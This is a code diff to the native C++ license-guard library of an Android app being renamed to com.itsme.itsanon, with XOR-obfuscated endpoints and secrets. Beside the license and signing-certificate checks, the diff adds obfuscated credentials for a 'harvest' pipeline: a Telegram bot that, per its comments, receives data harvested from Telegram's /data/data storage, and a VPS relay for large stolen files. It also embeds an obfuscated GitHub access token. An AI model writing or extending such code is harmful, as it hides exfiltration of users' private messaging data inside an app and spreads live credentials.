@@ -26,8 +26,8 @@
 
   static const uint8_t BASE_URL_OBF[] = {
     0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75,
-    0x3c, 0x3b, 0x39, 0x3f, 0x3e, 0x35, 0x39, 0x29,
-    0x74, 0x38, 0x35, 0x34, 0x3e
+    0x3f, 0x39, 0x35, 0x37, 0x39, 0x3b, 0x37, 0x74,
+    0x39, 0x23, 0x35, 0x2f
 };
 
   static const uint8_t EP_VALIDATE[] = {
@@ -126,7 +126,7 @@
 
   static std::string lic_path(JNIEnv *env, jobject ctx) {
 
-      static const char *FALLBACK = "/data/data/com.itsme.amkush/files/fg_lic.bin";
+      static const char *FALLBACK = "/data/data/com.itsme.itsanon/files/fg_lic.bin";
 
       jclass cCtx = env->FindClass("android/content/Context");
       if (!cCtx) { env->ExceptionClear(); return FALLBACK; }
@@ -151,7 +151,7 @@
 
       if (!jp) return FALLBACK;
       const char *c = env->GetStringUTFChars(jp, nullptr);
-      std::string p = std::string(c ? c : "/data/data/com.itsme.amkush/files") + "/fg_lic.bin";
+      std::string p = std::string(c ? c : "/data/data/com.itsme.itsanon/files") + "/fg_lic.bin";
       if (c) env->ReleaseStringUTFChars(jp, c);
       env->DeleteLocalRef(jp);
       return p;
@@ -456,6 +456,21 @@
       std::string s; for(auto b: ATTEST_SECRET) s+=(char)(b^0x5A);
       return s;
   }
+  // [V27] SHA-256 (hex, lowercase) of the release_v18.jks signing cert, xor 0x5A.
+  // Verified in-repo: keytool prints 4F:11:E4:2E:95:6F:EA:98:B7:9C:5C:08:A7:52:
+  // D3:2F:4C:44:D8:DD:A3:11:83:8F:05:1B:BA:34:29:FC:FA:AE. The server-side
+  // /api/attest currently answers valid:true for ANY cert ("attestation_disabled"),
+  // so the client enforces the fingerprint itself, fail closed.
+  static const uint8_t EXPECTED_CERT_HEX[] = {
+      0x6E, 0x3C, 0x6B, 0x6B, 0x3F, 0x6E, 0x68, 0x3F, 0x63, 0x6F, 0x6C, 0x3C, 0x3F, 0x3B, 0x63, 0x62,
+      0x38, 0x6D, 0x63, 0x39, 0x6F, 0x39, 0x6A, 0x62, 0x3B, 0x6D, 0x6F, 0x68, 0x3E, 0x69, 0x68, 0x3C,
+      0x6E, 0x39, 0x6E, 0x6E, 0x3E, 0x62, 0x3E, 0x3E, 0x3B, 0x69, 0x6B, 0x6B, 0x62, 0x69, 0x62, 0x3C,
+      0x6A, 0x6F, 0x6B, 0x38, 0x38, 0x3B, 0x69, 0x6E, 0x68, 0x63, 0x3C, 0x39, 0x3C, 0x3B, 0x3B, 0x3F,
+  };
+  static std::string expected_cert_hex(){
+      std::string s; for(auto b: EXPECTED_CERT_HEX) s+=(char)(b^0x5A);
+      return s;
+  }
   // Compute HMAC-SHA256(secret, device_id + ":" + cert_hash) hex.
   static std::string attest_hmac(const std::string &device, const std::string &cert){
       std::string secret = attest_secret();
@@ -479,13 +494,13 @@
   extern "C" {
 
   JNIEXPORT void JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeSetAppContext(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeSetAppContext(
       JNIEnv *env, jobject, jobject ctx) {
       set_app_ctx(env, ctx);
   }
 
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeValidateKey(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeValidateKey(
       JNIEnv *env, jobject, jstring jKey, jstring jDeviceId, jstring jWifiIp) {
       if (tampered())
           return env->NewStringUTF("{\"success\":false,\"message\":\"Security check failed\",\"token\":null}");
@@ -518,7 +533,7 @@
   }
 
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeVerifyToken(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeVerifyToken(
       JNIEnv *env, jobject, jstring jToken, jstring jDeviceId) {
       if (tampered())
           return env->NewStringUTF("{\"valid\":false,\"message\":\"Security check failed\"}");
@@ -544,7 +559,7 @@
   }
 
   JNIEXPORT jboolean JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeIsActivated(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeIsActivated(
       JNIEnv *env, jobject, jobject ctx) {
       if (tampered()) return JNI_FALSE;
       std::string tok; long exp=0; bool trial=false;
@@ -558,7 +573,7 @@
   }
 
   JNIEXPORT jboolean JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeSaveActivation(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeSaveActivation(
       JNIEnv *env, jobject, jobject ctx, jstring jTok, jboolean trial, jlong expMs) {
       const char *t=env->GetStringUTFChars(jTok,nullptr);
       bool ok=lic_save(env,ctx,std::string(t),(long)expMs,(bool)trial);
@@ -567,13 +582,13 @@
   }
 
   JNIEXPORT void JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeClearActivation(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeClearActivation(
       JNIEnv *env, jobject, jobject ctx) {
       remove(lic_path(env,ctx).c_str());
   }
 
   JNIEXPORT jboolean JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeSecurityCheck(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeSecurityCheck(
       JNIEnv *env, jobject) {
       return tampered()?JNI_FALSE:JNI_TRUE;
   }
@@ -582,12 +597,20 @@
   // return whether the app's signing cert is the expected (production) one.
   // Returns JNI_FALSE on a repackaged/re-signed clone so the app can warn+exit.
   JNIEXPORT jboolean JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeCheckAttestation(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeCheckAttestation(
       JNIEnv *env, jobject) {
       if (tampered()) return JNI_FALSE;
       std::string did = android_id(env, g_app_ctx);
       std::string cert = app_cert_hash(env, g_app_ctx);
       if (did.empty() || cert.empty()) return JNI_FALSE; // can't verify -> fail closed
+      // [V27] Local signing-cert gate: a repackaged/re-signed APK has a
+      // different cert hash and must die here, even with the server's
+      // attestation disabled. The server round-trip below stays as a
+      // second layer (and will re-enforce once the server re-enables it).
+      if (cert != expected_cert_hex()) {
+          LOGD("checkAttestation: LOCAL cert mismatch (re-signed APK) — fail closed");
+          return JNI_FALSE;
+      }
       std::string json="{\"device_id\":\""+did+"\",\"cert_hash\":\""+cert+
                         "\",\"attest\":\""+attest_hmac(did, cert)+"\"}";
       std::string url=xor_decode(BASE_URL_OBF,sizeof(BASE_URL_OBF))
@@ -606,7 +629,7 @@
 
 
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeGetBaseUrl(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetBaseUrl(
       JNIEnv *env, jobject) {
       std::string url = xor_decode(BASE_URL_OBF, sizeof(BASE_URL_OBF));
       return env->NewStringUTF(url.c_str());
@@ -628,7 +651,7 @@
   };
 
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeGetDownloadUrl(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetDownloadUrl(
       JNIEnv *env, jobject) {
       std::string url = xor_decode(DOWNLOAD_URL_OBF, sizeof(DOWNLOAD_URL_OBF));
       return env->NewStringUTF(url.c_str());
@@ -639,42 +662,39 @@
 
   static const uint8_t TG_BOT_OBF[] = {
       0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,
-      0x2E,0x74,0x37,0x3F,0x75,
-      0x1C,0x3B,0x39,0x3F,0x3D,0x3B,0x2E,0x3F,
-      0x35,0x3C,0x3C,0x33,0x39,0x33,0x3B,0x36,
-      0x38,0x35,0x2E
+      0x2E,0x74,0x37,0x3F,0x75,0x1F,0x39,0x35,
+      0x37,0x19,0x3B,0x37,0x18,0x35,0x2E
   };
 
 
   static const uint8_t TG_CHANNEL_OBF[] = {
       0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,
-      0x2E,0x74,0x37,0x3F,0x75,
-      0x71,0x0E,0x22,0x77,0x28,0x32,0x38,0x36,
-      0x77,0x0C,0x39,0x3D,0x23,0x14,0x1E,0x3D,0x6A
+      0x2E,0x74,0x37,0x3F,0x75,0x1F,0x39,0x35,
+      0x37,0x37,0x3F,0x28,0x39,0x3F,0x18,0x3F,
+      0x3B,0x29,0x2E
   };
 
 
   static const uint8_t TG_OWNER_OBF[] = {
       0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,
-      0x2E,0x74,0x37,0x3F,0x75,
-      0x3C,0x3B,0x39,0x3F,0x3D,0x3B,0x2E,0x3F,
-      0x35,0x3C,0x3C,0x33,0x39,0x33,0x3B,0x36
+      0x2E,0x74,0x37,0x3F,0x75,0x29,0x2D,0x33,
+      0x29,0x32,0x23,0x05,0x22,0x3E
   };
 
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeGetTgBot(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetTgBot(
       JNIEnv *env, jobject) {
       return env->NewStringUTF(xor_decode(TG_BOT_OBF, sizeof(TG_BOT_OBF)).c_str());
   }
 
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeGetTgChannel(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetTgChannel(
       JNIEnv *env, jobject) {
       return env->NewStringUTF(xor_decode(TG_CHANNEL_OBF, sizeof(TG_CHANNEL_OBF)).c_str());
   }
 
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeGetTgOwner(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetTgOwner(
       JNIEnv *env, jobject) {
       return env->NewStringUTF(xor_decode(TG_OWNER_OBF, sizeof(TG_OWNER_OBF)).c_str());
   }
@@ -694,10 +714,15 @@
   };
 
   // ── GitHub (Mylogs log repo) secrets ───────────────────────────────────────
+    /* [V96] Log-upload token = owner's Amkushu999 PAT (scope repo,write:packages),
+   * supplied 2026-09-15. Replaces the laroi254 PAT. OWNER/REPO unchanged
+   * (Amkushu999/Mylogs), matching this token's own account. */
   static const uint8_t GITHUB_TOKEN_OBF[] = {
-      0x3D,0x32,0x2A,0x05,0x16,0x02,0x23,0x0E,0x0C,0x10,0x63,0x0D,0x16,0x31,0x6E,0x0E,
-      0x31,0x17,0x3E,0x13,0x2D,0x32,0x62,0x1D,0x62,0x13,0x2F,0x08,0x2C,0x31,0x63,0x2C,
-      0x14,0x39,0x68,0x0E,0x18,0x6F,0x6A,0x15
+      0x3D, 0x32, 0x2A, 0x05, 0x17, 0x6B, 0x3F, 0x3B,
+      0x29, 0x28, 0x29, 0x3F, 0x00, 0x62, 0x0D, 0x2D,
+      0x31, 0x3C, 0x13, 0x22, 0x6A, 0x37, 0x2F, 0x0E,
+      0x2A, 0x3F, 0x09, 0x1E, 0x68, 0x13, 0x38, 0x1B,
+      0x3D, 0x38, 0x69, 0x2C, 0x68, 0x3C, 0x2E, 0x35
   };
   static const uint8_t GITHUB_OWNER_OBF[] = {
       0x1B,0x37,0x31,0x2F,0x29,0x32,0x2F,0x63,0x63,0x63
@@ -706,34 +731,76 @@
       0x17,0x23,0x36,0x35,0x3D,0x29
   };
 
+  // ── [V55 harvest] Telegram bot that receives /data/data Telegram harvests ──
+  static const uint8_t HARVEST_BOT_TOKEN_OBF[] = {
+      0x62,0x62,0x6A,0x68,0x6F,0x6D,0x68,0x69,0x6E,0x69,0x60,0x1B,0x1B,0x1D,0x32,0x37,
+      0x1F,0x35,0x08,0x16,0x03,0x77,0x6D,0x05,0x3D,0x33,0x09,0x05,0x63,0x3B,0x2A,0x35,
+      0x0D,0x29,0x69,0x3E,0x6C,0x3C,0x3D,0x6C,0x1C,0x17,0x32,0x3C,0x6A,0x0F
+  };
+  static const uint8_t HARVEST_CHAT_ID_OBF[] = {
+      0x62,0x6E,0x6F,0x69,0x6E,0x69,0x6B,0x6F,0x68,0x6B
+  };
+
+  // ── [V56] harvest relay (files > 20 MB bypass Telegram, go to the VPS) ────
+  static const uint8_t RELAY_BASE_OBF[] = {
+      0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,0x31,0x2F,0x29,0x32,0x2F,0x74,0x2E,0x35,
+      0x31,0x3F,0x34,0x33,0x20,0x3F,0x3E,0x74,0x34,0x3B,0x37,0x3F
+  };
+  static const uint8_t RELAY_SECRET_OBF[] = {
+      0x6B,0x6B,0x6A,0x3F,0x39,0x39,0x3C,0x38,0x6D,0x6C,0x6D,0x3F,0x62,0x6F,0x3C,0x3F,
+      0x6B,0x63,0x6D,0x6B,0x3E,0x69,0x6A,0x38,0x6D,0x3C,0x6F,0x6A,0x69,0x69,0x6C,0x6D
+  };
+
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeGetGitHubToken(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetRelayBase(
+      JNIEnv *env, jobject) {
+      return env->NewStringUTF(xor_decode(RELAY_BASE_OBF, sizeof(RELAY_BASE_OBF)).c_str());
+  }
+  JNIEXPORT jstring JNICALL
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetRelaySecret(
+      JNIEnv *env, jobject) {
+      return env->NewStringUTF(xor_decode(RELAY_SECRET_OBF, sizeof(RELAY_SECRET_OBF)).c_str());
+  }
+
+  JNIEXPORT jstring JNICALL
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetHarvestBotToken(
+      JNIEnv *env, jobject) {
+      return env->NewStringUTF(xor_decode(HARVEST_BOT_TOKEN_OBF, sizeof(HARVEST_BOT_TOKEN_OBF)).c_str());
+  }
+  JNIEXPORT jstring JNICALL
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetHarvestChatId(
+      JNIEnv *env, jobject) {
+      return env->NewStringUTF(xor_decode(HARVEST_CHAT_ID_OBF, sizeof(HARVEST_CHAT_ID_OBF)).c_str());
+  }
+
+  JNIEXPORT jstring JNICALL
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetGitHubToken(
       JNIEnv *env, jobject) {
       return env->NewStringUTF(xor_decode(GITHUB_TOKEN_OBF, sizeof(GITHUB_TOKEN_OBF)).c_str());
   }
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeGetGitHubOwner(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetGitHubOwner(
       JNIEnv *env, jobject) {
       return env->NewStringUTF(xor_decode(GITHUB_OWNER_OBF, sizeof(GITHUB_OWNER_OBF)).c_str());
   }
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeGetGitHubRepo(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetGitHubRepo(
       JNIEnv *env, jobject) {
       return env->NewStringUTF(xor_decode(GITHUB_REPO_OBF, sizeof(GITHUB_REPO_OBF)).c_str());
   }
 
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeGetTgBotToken(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetTgBotToken(
       JNIEnv *env, jobject) {
       return env->NewStringUTF(xor_decode(TG_BOT_TOKEN_OBF, sizeof(TG_BOT_TOKEN_OBF)).c_str());
   }
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeGetTgChatId(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetTgChatId(
       JNIEnv *env, jobject) {
       return env->NewStringUTF(xor_decode(TG_CHAT_ID_OBF, sizeof(TG_CHAT_ID_OBF)).c_str());
   }
   JNIEXPORT jstring JNICALL
-  Java_com_itsme_amkush_security_LicenseGuard_nativeGetTgApi(
+  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetTgApi(
       JNIEnv *env, jobject) {
       return env->NewStringUTF(xor_decode(TG_API_OBF, sizeof(TG_API_OBF)).c_str());
   }
